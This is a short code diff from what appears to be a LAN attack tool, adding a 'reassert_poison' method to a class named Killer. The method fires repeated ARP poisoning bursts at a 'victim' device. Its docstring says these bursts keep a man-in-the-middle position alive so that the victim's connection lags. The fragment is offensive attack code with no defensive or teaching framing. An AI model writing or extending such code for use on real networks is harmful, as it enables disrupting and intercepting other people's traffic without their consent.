@@ -185,6 +185,19 @@ class Killer:
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(victim, wait_after, seq)
 
+    def reassert_poison(self, victim, repeats=3):
+        """
+        Extra poison burst without bumping ``_op_seq`` or restarting the ARP worker.
+
+        Lag start reassert timers (0/40/110 ms) must use this — calling ``kill()``
+        again cancels the worker mid-loop and MITM never sustains (no lag at all).
+        """
+        mac = victim.get('mac') if isinstance(victim, dict) else None
+        if not mac or mac not in self.killed:
+            return
+        seq = int(self._op_seq.get(mac, 0))
+        self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)
+
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
 
